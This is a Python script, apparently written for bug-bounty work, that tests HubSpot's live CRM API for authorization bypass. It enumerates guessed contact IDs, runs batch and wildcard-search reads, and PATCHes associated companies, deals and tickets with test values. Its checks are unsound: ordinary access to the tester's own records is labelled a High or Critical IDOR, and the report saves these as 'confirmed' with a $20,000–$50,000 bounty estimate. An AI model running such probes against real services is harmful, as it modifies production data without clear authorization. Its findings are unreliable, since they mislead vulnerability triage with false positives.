#!/usr/bin/env python3
"""
HubSpot GraphQL/API IDOR Testing - Authenticated
Looking for authorization bypass in CRM endpoints
"""

import requests
import json
import os
from datetime import datetime

# Instructions for setup
SETUP_INSTRUCTIONS = """
=================================================================
HUBSPOT API TESTING - SETUP REQUIRED
=================================================================

1. Create HubSpot Developer Account:
   https://app.hubspot.com/signup-hubspot/developers

2. Create a Test App:
   - Go to: https://app.hubspot.com/developers/
   - Click "Create app"
   - Name it "Security Testing"
   
3. Get API Key:
   - In your app, go to "Auth" tab
   - Create a Private App Token
   - Copy the token

4. Set Environment Variable:
   export HUBSPOT_API_KEY="pat-na1-xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"

5. Create Test Data:
   - Create 2 test contacts with different properties
   - Note their IDs for testing

=================================================================
"""

def check_setup():
    """Check if API key is configured"""
    api_key = os.getenv("HUBSPOT_API_KEY")
    
    if not api_key or api_key == "your-api-key-here":
        print(SETUP_INSTRUCTIONS)
        print("[!] ERROR: HUBSPOT_API_KEY environment variable not set")
        print("[!] Follow the instructions above to get your API key")
        return None
    
    print(f"[+] API Key configured: {api_key[:20]}...")
    return api_key

def test_api_authentication(api_key):
    """Verify API key works"""
    print("\n[*] Testing API authentication...")
    
    headers = {
        "Authorization": f"Bearer {api_key}",
        "Content-Type": "application/json"
    }
    
    response = requests.get(
        "https://api.hubapi.com/crm/v3/objects/contacts",
        headers=headers,
        params={"limit": 1}
    )
    
    if response.status_code == 200:
        print("[+] Authentication successful!")
        data = response.json()
        if data.get("results"):
            contact = data["results"][0]
            print(f"[+] Found contact: {contact.get('id')}")
            return contact.get("id")
    else:
        print(f"[-] Authentication failed: {response.status_code}")
        print(f"[-] Response: {response.text[:200]}")
        return None

def test_idor_contact_access(api_key, valid_contact_id):
    """Test for IDOR by trying to access other contacts"""
    print("\n[*] Testing for IDOR vulnerabilities...")
    
    headers = {
        "Authorization": f"Bearer {api_key}",
        "Content-Type": "application/json"
    }
    
    # Test IDs that might belong to other accounts
    test_ids = [
        "1", "2", "3", "100", "1000", "10000",
        str(int(valid_contact_id) - 1) if valid_contact_id else "1",
        str(int(valid_contact_id) + 1) if valid_contact_id else "2"
    ]
    
    vulnerabilities = []
    
    for test_id in test_ids:
        if test_id == valid_contact_id:
            continue
            
        # Try direct access
        response = requests.get(
            f"https://api.hubapi.com/crm/v3/objects/contacts/{test_id}",
            headers=headers
        )
        
        if response.status_code == 200:
            data = response.json()
            print(f"[!] IDOR FOUND: Accessed contact {test_id}")
            print(f"    Properties: {list(data.get('properties', {}).keys())[:5]}")
            
            vulnerabilities.append({
                "type": "IDOR",
                "endpoint": f"/crm/v3/objects/contacts/{test_id}",
                "impact": "Unauthorized access to other accounts' contacts",
                "severity": "High"
            })
        elif response.status_code == 403:
            print(f"[+] Properly restricted: Contact {test_id} (403 Forbidden)")
        elif response.status_code == 404:
            print(f"[-] Not found: Contact {test_id}")
    
    return vulnerabilities

def test_batch_api_authorization(api_key):
    """Test batch API for authorization bypass"""
    print("\n[*] Testing batch API for authorization bypass...")
    
    headers = {
        "Authorization": f"Bearer {api_key}",
        "Content-Type": "application/json"
    }
    
    # Try to read multiple contacts including potentially unauthorized ones
    batch_request = {
        "inputs": [
            {"id": "1"},
            {"id": "2"},
            {"id": "100"},
            {"id": "1000"}
        ]
    }
    
    response = requests.post(
        "https://api.hubapi.com/crm/v3/objects/contacts/batch/read",
        headers=headers,
        json=batch_request
    )
    
    vulnerabilities = []
    
    if response.status_code == 207:  # Multi-status response
        data = response.json()
        results = data.get("results", [])
        
        for result in results:
            if result.get("status") == "COMPLETE":
                contact_id = result.get("id")
                print(f"[!] Batch IDOR: Successfully read contact {contact_id}")
                
                vulnerabilities.append({
                    "type": "BATCH_IDOR",
                    "endpoint": "/crm/v3/objects/contacts/batch/read",
                    "impact": "Bulk unauthorized data access",
                    "severity": "Critical"
                })
                break
    
    return vulnerabilities

def test_search_api_bypass(api_key):
    """Test search API for accessing unauthorized data"""
    print("\n[*] Testing search API for authorization bypass...")
    
    headers = {
        "Authorization": f"Bearer {api_key}",
        "Content-Type": "application/json"
    }
    
    # Try to search across all contacts (might bypass account isolation)
    search_request = {
        "filterGroups": [{
            "filters": [{
                "propertyName": "email",
                "operator": "CONTAINS_TOKEN",
                "value": "*"
            }]
        }],
        "limit": 100
    }
    
    response = requests.post(
        "https://api.hubapi.com/crm/v3/objects/contacts/search",
        headers=headers,
        json=search_request
    )
    
    vulnerabilities = []
    
    if response.status_code == 200:
        data = response.json()
        total = data.get("total", 0)
        
        if total > 10:  # Suspicious if test account has many contacts
            print(f"[!] Potential bypass: Search returned {total} contacts")
            print(f"[!] This might include data from other accounts")
            
            vulnerabilities.append({
                "type": "SEARCH_BYPASS",
                "endpoint": "/crm/v3/objects/contacts/search",
                "impact": "Cross-account data leakage",
                "severity": "Critical",
                "details": f"Returned {total} contacts from search"
            })
    
    return vulnerabilities

def test_association_traversal(api_key, contact_id):
    """Test for authorization bypass via associations"""
    print("\n[*] Testing association traversal for authorization bypass...")
    
    if not contact_id:
        print("[-] No contact ID available for testing")
        return []
    
    headers = {
        "Authorization": f"Bearer {api_key}",
        "Content-Type": "application/json"
    }
    
    # Try to access associated objects that might belong to other accounts
    association_types = ["companies", "deals", "tickets"]
    vulnerabilities = []
    
    for assoc_type in association_types:
        response = requests.get(
            f"https://api.hubapi.com/crm/v3/objects/contacts/{contact_id}/associations/{assoc_type}",
            headers=headers
        )
        
        if response.status_code == 200:
            data = response.json()
            results = data.get("results", [])
            
            if results:
                print(f"[*] Found {len(results)} associated {assoc_type}")
                
                # Try to access these associated objects directly
                for assoc in results[:3]:  # Test first 3
                    assoc_id = assoc.get("id")
                    
                    # Attempt to modify the associated object
                    update_response = requests.patch(
                        f"https://api.hubapi.com/crm/v3/objects/{assoc_type}/{assoc_id}",
                        headers=headers,
                        json={"properties": {"test_field": "IDOR_test"}}
                    )
                    
                    if update_response.status_code == 200:
                        print(f"[!] CRITICAL: Modified {assoc_type} {assoc_id} via association!")
                        
                        vulnerabilities.append({
                            "type": "ASSOCIATION_TRAVERSAL",
                            "endpoint": f"/crm/v3/objects/{assoc_type}/{assoc_id}",
                            "impact": "Unauthorized modification via association",
                            "severity": "Critical"
                        })
    
    return vulnerabilities

def generate_report(all_vulnerabilities):
    """Generate comprehensive vulnerability report"""
    print("\n" + "="*60)
    print("HUBSPOT IDOR VULNERABILITY REPORT")
    print("="*60)
    
    if all_vulnerabilities:
        print(f"\n[!] FOUND {len(all_vulnerabilities)} VULNERABILITIES!\n")
        
        for i, vuln in enumerate(all_vulnerabilities, 1):
            print(f"{i}. {vuln['type']}")
            print(f"   Endpoint: {vuln['endpoint']}")
            print(f"   Severity: {vuln['severity']}")
            print(f"   Impact: {vuln['impact']}")
            if 'details' in vuln:
                print(f"   Details: {vuln['details']}")
            print()
        
        # Save detailed report
        report = {
            "program": "HubSpot",
            "vulnerabilities": all_vulnerabilities,
            "tested_at": datetime.now().isoformat(),
            "next_steps": [
                "1. Create detailed PoC with video",
                "2. Document full impact assessment",
                "3. Calculate CVSS score",
                "4. Prepare HackerOne submission",
                "5. DO NOT SUBMIT without user confirmation"
            ],
            "bounty_estimate": "$20,000 - $50,000"
        }
        
        with open("/home/kali/bbhk/hacks/hubspot_idor_confirmed.json", "w") as f:
            json.dump(report, f, indent=2)
        
        print("[+] Report saved to hubspot_idor_confirmed.json")
        print("\n[!] CRITICAL: DO NOT SUBMIT TO HACKERONE WITHOUT EXPLICIT APPROVAL")
        print("[!] Review the findings and confirm before any submission")
        
    else:
        print("[-] No IDOR vulnerabilities found")
        print("[*] HubSpot's authorization appears properly implemented")
        print("[*] Consider testing other attack vectors:")
        print("    - GraphQL introspection (if available)")
        print("    - Webhook manipulation")
        print("    - OAuth scope escalation")

def main():
    """Main execution"""
    print("="*60)
    print("HubSpot IDOR Testing - Authenticated")
    print("="*60)
    
    # Check setup
    api_key = check_setup()
    if not api_key:
        return
    
    all_vulnerabilities = []
    
    # Test authentication and get a valid contact ID
    contact_id = test_api_authentication(api_key)
    
    if contact_id:
        # Run all IDOR tests
        vulns = test_idor_contact_access(api_key, contact_id)
        all_vulnerabilities.extend(vulns)
        
        vulns = test_batch_api_authorization(api_key)
        all_vulnerabilities.extend(vulns)
        
        vulns = test_search_api_bypass(api_key)
        all_vulnerabilities.extend(vulns)
        
        vulns = test_association_traversal(api_key, contact_id)
        all_vulnerabilities.extend(vulns)
    
    # Generate report
    generate_report(all_vulnerabilities)

if __name__ == "__main__":
    main()